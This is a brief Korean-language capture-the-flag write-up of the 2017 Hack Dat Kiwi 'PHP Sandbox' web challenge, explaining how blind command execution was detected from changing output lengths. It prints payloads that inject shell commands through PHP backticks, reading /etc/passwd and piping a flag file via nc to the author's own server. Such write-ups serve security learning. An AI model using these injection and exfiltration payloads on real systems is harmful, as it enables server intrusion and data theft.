# [2017_Hack_Dat_Kiwi] \[Web] PHP Sandbox

## Analysis

(서버가 닫혀 있어서 로그와 기억을 기반으로 작성하겠습니다.)

```
http -f POST http://7a0567.2017.hack.dat.kiwi/experimental/sandbox/ code='<?php echo `ls`?>'
```

```
http -f POST http://7a0567.2017.hack.dat.kiwi/experimental/sandbox/ code='<?php echo `cat /etc/passwd`?>'
```

위와 같은 shell command를 입력했을 때, output이 나오진 않았지만 output의 length가 계속적으로 변한다는 점을 발견했습니다. 이를 통해 내부적으로는 command가 먹히지만 output만 출력해주지 않는 방식이라고 생각했습니다.

## Exploit

```
http -f POST http://7a0567.2017.hack.dat.kiwi/experimental/sandbox/ code='<?php echo `cat /var/www/html/flag.txt | nc myserver.addr 9999`?>'
```

flag.txt 파일의 위치를 찾아서 제 서버로 reverse connect시켜서 플래그를 읽어왔습니다.